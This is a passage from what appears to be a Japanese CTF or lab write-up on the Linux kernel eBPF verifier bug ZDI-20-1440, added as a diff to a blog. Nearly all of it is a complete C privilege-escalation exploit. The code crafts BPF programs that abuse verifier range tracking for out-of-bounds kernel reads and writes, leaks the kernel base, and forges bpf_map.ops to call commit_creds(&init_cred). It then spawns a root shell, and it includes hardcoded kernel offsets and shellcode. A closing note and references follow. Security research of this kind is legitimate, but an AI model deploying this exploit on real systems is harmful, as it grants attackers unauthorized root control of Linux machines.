+    .off   = 0,                                 \
+    .imm   = 0 })
+#define BPF_MOV64_IMM(DST, IMM)                 \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
+    .dst_reg = DST,                             \
+    .src_reg = 0,                               \
+    .off   = 0,                                 \
+    .imm   = IMM })
+
+int bpf_(int cmd, union bpf_attr *attrs) {
+  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
+}
+
+int array_create(int value_size, int num_entries) {
+  union bpf_attr create_map_attrs = {
+      .map_type = BPF_MAP_TYPE_ARRAY,
+      .key_size = 4,
+      .value_size = value_size,
+      .max_entries = num_entries
+  };
+  int mapfd = bpf_(BPF_MAP_CREATE, &amp;create_map_attrs);
+  if (mapfd == -1)
+    err(1, &quot;map create&quot;);
+  return mapfd;
+}
+
+int array_update(int mapfd, uint32_t key, uint64_t value)
+{
+  union bpf_attr attr = {
+    .map_fd = mapfd,
+    .key = (uint64_t)&amp;key,
+    .value = (uint64_t)&amp;value,
+    .flags = BPF_ANY,
+  };
+  return bpf_(BPF_MAP_UPDATE_ELEM, &amp;attr);
+}
+
+int array_update_big(int mapfd, uint32_t key, char* value)
+{
+  union bpf_attr attr = {
+    .map_fd = mapfd,
+    .key = (uint64_t)&amp;key,
+    .value = value,
+    .flags = BPF_ANY,
+  };
+  return bpf_(BPF_MAP_UPDATE_ELEM, &amp;attr);
+}
+
+unsigned long get_ulong(int map_fd, uint64_t idx) {
+  uint64_t value;
+  union bpf_attr lookup_map_attrs = {
+    .map_fd = map_fd,
+    .key = (uint64_t)&amp;idx,
+    .value = (uint64_t)&amp;value
+  };
+  if (bpf_(BPF_MAP_LOOKUP_ELEM, &amp;lookup_map_attrs))
+    err(1, &quot;MAP_LOOKUP_ELEM&quot;);
+  return value;
+}
+
+int prog_load(struct bpf_insn *insns, size_t insns_count) {
+  char verifier_log[100000];
+  union bpf_attr create_prog_attrs = {
+    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+    .insn_cnt = insns_count,
+    .insns = (uint64_t)insns,
+    .license = (uint64_t)&quot;GPL v2&quot;,
+    .log_level = 2,
+    .log_size = sizeof(verifier_log),
+    .log_buf = (uint64_t)verifier_log
+  };
+  int progfd = bpf_(BPF_PROG_LOAD, &amp;create_prog_attrs);
+  int errno_ = errno;
+  //printf(&quot;==========================\n%s==========================\n&quot;,verifier_log);
+  errno = errno_;
+  if (progfd == -1)
+    err(1, &quot;prog load&quot;);
+  return progfd;
+}
+
+int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
+  int progfd = prog_load(insns, insns_count);
+
+  int socks[2];
+  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
+    err(1, &quot;socketpair&quot;);
+  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(int)))
+    err(1, &quot;setsockopt&quot;);
+  return socks[1];
+}
+
+void trigger_proc(int sockfd) {
+  if (write(sockfd, &quot;X&quot;, 1) != 1)
+    err(1, &quot;write to proc socket failed&quot;);
+}
+// (END eBPF-utils)
+
+
+// commands
+#define DEV_PATH &quot;&quot;   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+int control_map;
+int reader = -1;
+// (END globals)
+
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
+#define REP(N) for(int moratorium=0; moratorium!+N; ++N)
+ulong user_cs,user_ss,user_sp,user_rflags;
+struct pt_regs {
+  ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+  ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+  ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+  ulong orig_ax; ulong ip; ulong cs; ulong flags;
+  ulong sp; ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  int ruid, euid, suid;
+  getresuid(&amp;ruid, &amp;euid, &amp;suid);
+  if(euid != 0)
+    errExit(&quot;[ERROR] somehow, couldn&#x27;t get root...&quot;);
+  system(&quot;/bin/sh&quot;);
+}
+// should compile with -masm=intel
+static void save_state(void) {
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
+}
+
+static void shellcode(void){
+  asm(
+    &quot;xor rdi, rdi\n&quot;
+    &quot;mov rbx, QWORD PTR [rsp+0x50]\n&quot;
+    &quot;sub rbx, 0x244566\n&quot;
+    &quot;mov rcx, rbx\n&quot;
+    &quot;call rcx\n&quot;
+    &quot;mov rdi, rax\n&quot;
+    &quot;sub rbx, 0x470\n&quot;
+    &quot;call rbx\n&quot;
+    &quot;add rsp, 0x20\n&quot;
+    &quot;pop rbx\n&quot;
+    &quot;pop r12\n&quot;
+    &quot;pop r13\n&quot;
+    &quot;pop r14\n&quot;
+    &quot;pop r15\n&quot;
+    &quot;pop rbp\n&quot;
+    &quot;ret\n&quot;
+  );
+}
+// (END utils)
+
+ulong read_rel(int N)
+{
+  struct bpf_insn reader_insns[] = {
+    /* get cmap[0] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
+    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &amp;cmap[0]
+    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &amp;cmap[0]
+    /* get cmap[1] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
+    /* fix r6/r7 range */
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0&lt;=R6&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0&lt;=R7&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    // exploit r6 range 
+    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 &gt;&gt;= r7 (r6 regarded as 0, actually 1)
+    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
+    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),               // r6 *= N
+
+    // load it malciously
+    BPF_ALU64_REG(BPF_ADD, BPF_REG_9, BPF_REG_6),       // r9 += r6 (r9 = &amp;cmap[0] + N)
+    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_9, 0),       // r3 = qword [r9] (r3 = [&amp;cmap[0] + N])
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_3, 0),       // [r8] = r3 (cmap[0] = r9)
+    // Go Home
+    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
+    BPF_EXIT_INSN()
+  };
+
+  reader = create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));
+  if(reader &lt; 0){
+    errExit(&quot;reader not initialized&quot;);
+  }
+  array_update(control_map, 0, 1);
+  array_update(control_map, 1, 0);
+  trigger_proc(reader);
+  const ulong tmp = get_ulong(control_map, 0);
+  return tmp;
+}
+
+ulong leak_controlmap(void)
+{
+  struct bpf_insn reader_insns[] = {
+    /* get cmap[0] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
+    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &amp;cmap[0]
+    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &amp;cmap[0]
+
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_8, 0),       // [r8] = r3 (cmap[0] = r9)
+    // Go Home
+    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
+    BPF_EXIT_INSN()
+  };
+
+  int tmp_reader = create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));
+  if(tmp_reader &lt; 0){
+    errExit(&quot;tmp_reader not initialized&quot;);
+  }
+  trigger_proc(tmp_reader);
+  const ulong tmp = get_ulong(control_map, 0);
+  return tmp;
+}
+
+void ops_NIRUGIRI(ulong controlmap_addr, ulong kernbase)
+{
+  const ulong fakeops_addr = controlmap_addr + 0x10;
+  const ulong init_cred = kernbase + 0xE43E60;
+  const ulong commit_creds = kernbase + 0x081E70;
+  const uint N = 0x90;
+  const uint zero = 0;
+  printf(&quot;[.] init_cred: 0x%lx\n&quot;, (((init_cred&gt;&gt;32) &amp; 0xFFFFFFFFUL)&lt;&lt;32) + (init_cred &amp; 0xFFFFFFFFUL));
+
+  struct bpf_insn writer_insns[] = {
+    /* get cmap[0] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
+    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &amp;cmap[0]
+    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &amp;cmap[0]
+    /* get cmap[1] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
+    /* fix r6/r7 range */
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0&lt;=R6&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0&lt;=R7&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    // exploit r6 range 
+    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 &gt;&gt;= r7 (r6 regarded as 0, actually 1)
+    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
+    // overwrite ops into forged ops
+    BPF_MOV64_IMM(BPF_REG_1, (fakeops_addr&gt;&gt;32) &amp; 0xFFFFFFFFUL),
+    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, fakeops_addr &amp; 0xFFFFFFFFUL),
+    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),
+    BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),       // r8 += r6
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0),
+    // forge ptrs[0] with &amp;init_cred
+    BPF_MOV64_IMM(BPF_REG_2, 0),
+    BPF_MOV64_IMM(BPF_REG_3, init_cred &amp; 0xFFFFFFFFUL),
+    BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),
+    BPF_ALU64_IMM(BPF_ARSH, BPF_REG_3, 32),
+    BPF_ALU64_REG(BPF_ADD, BPF_REG_2, BPF_REG_3),
+    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, 0),
+    
+    // Go Home
+    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
+    BPF_EXIT_INSN()
+  };
+
+  int evilwriter= create_filtered_socket_fd(writer_insns, ARRSIZE(writer_insns));
+  if(evilwriter &lt; 0){
+    errExit(&quot;reader not initialized&quot;);
+  }
+
+  // setup fake table
+  for(int ix=0; ix!=10; ++ix){
+    array_update(control_map, ix+2, commit_creds);
+  }
+  array_update(control_map, 6, kernbase + 0x12B730);  // fd_array_map_delete_elem
+
+  // overwrite bpf_map.ops
+  array_update(control_map, 0, 1);
+  array_update(control_map, 1, 0);
+  trigger_proc(evilwriter);
+
+  // NIRUGIRI
+  union bpf_attr lookup_map_attrs = {
+    .map_fd = control_map,
+    .key = (uint64_t)&amp;zero,
+  };
+  bpf_(BPF_MAP_LOOKUP_ELEM, &amp;lookup_map_attrs);
+  NIRUGIRI();
+  printf(&quot;[-] press ENTER to die\n&quot;);
+  WAIT;
+}
+
+int main(int argc, char *argv[]) {
+  control_map = array_create(0x8, 0x10); // [0] always 1, [1] always 0
+
+  // leak kernbase
+  const ulong kernbase = read_rel(0x90) - 0xA12100;
+  printf(&quot;[+] kernbase: 0x%lx\n&quot;, kernbase);
+
+  // leak controlmap&#x27;s addr
+  const ulong controlmap_addr = leak_controlmap();
+  printf(&quot;[+] controlmap: 0x%lx\n&quot;, controlmap_addr);
+
+  // forge bpf_map.ops and do commit_creds(&amp;init_cred)
+  ops_NIRUGIRI(controlmap_addr, kernbase);
+
+  return 0; // unreachable
+}
+</pre>
+<p></p>
+<h3>8: アウトロ</h3>
+<p>最初は権限ゆるすぎてどうなんだろうと思ってたけど、<code>bpf_map.btf</code>なしでROOT取る流れを考えるのは楽しかったです。</p>
+<p>もうすぐ春ですね。海を見に行きたいです。</p>
+<p></p>
+<p></p>
+<h3>9: 参考</h3>
+<p>1: author&#x27;s writeup</p>
+<p><a href='https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/'>https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/</a></p>
+<p>2: original 0-day blog</p>
+<p><a href='https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier'>https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier</a></p>
+<p>3: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
